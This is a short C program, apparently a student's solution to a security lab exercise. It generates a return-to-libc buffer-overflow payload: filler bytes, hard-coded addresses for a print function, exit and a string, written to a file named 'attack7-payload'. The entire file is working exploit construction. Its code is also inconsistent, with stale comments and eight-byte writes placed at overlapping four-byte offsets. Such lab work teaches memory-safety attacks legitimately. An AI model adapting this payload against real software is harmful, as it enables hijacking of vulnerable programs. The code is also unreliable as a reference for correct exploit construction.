#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"

int main(int argc, char **argv)
{
    char inputStr[300];  // Make sure it's large enough to accommodate the input
    char name[10] = "Tingyang\n\0";
    unsigned long long print_address = 0xf7e2c060;  // Address of the 1 function
    unsigned long long name_address = 0xffffd258;  // Address of the 2 function
    unsigned long long exit_address = 0xf7e0f990;  // Address of the exit function

    // Calculate the offset to reach functionPtr
    int offset = 87;

    // Fill the inputStr with 'A' to reach the functionPtr
    memset(inputStr, 'A', offset);

    // Overwrite functionPtr with the address of rescue
    *((unsigned long long*)(inputStr + offset)) = print_address;
    *((unsigned long long*)(inputStr + offset + 4)) = exit_address;
    *((unsigned long long*)(inputStr + offset + 8)) = name_address;
    memcpy(inputStr + offset + 12, name, 10);
    /* YOUR CODE: Generate buf appropriately */
    write_to_file( "attack7-payload", inputStr , 300, FILE_CLEAR );
    exit(0);
}